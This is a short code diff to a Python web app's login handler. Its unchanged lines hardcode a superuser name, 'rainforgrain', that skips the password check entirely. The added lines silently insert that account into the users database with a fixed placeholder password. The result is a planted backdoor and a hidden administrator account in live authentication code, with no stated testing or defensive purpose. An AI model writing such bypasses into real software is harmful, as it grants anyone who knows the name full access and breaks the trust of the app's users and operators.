@@ -299,6 +299,14 @@ async def register(username: str = Form(...), password: str = Form(...)):
 async def login(username: str = Form(...), password: str = Form(...)):
     if username == "rainforgrain":
         # Superuser skip password check
+        # Ensure superuser exists in the DB for foreign key constraints
+        conn = next(get_db())
+        cursor = conn.cursor()
+        cursor.execute("SELECT username FROM users WHERE username = ?", (username,))
+        if not cursor.fetchone():
+            cursor.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
+                           (username, hash_password("internal_bypass_value")))
+            conn.commit()
         return {"username": "rainforgrain", "is_superuser": True}
 
     conn = next(get_db())
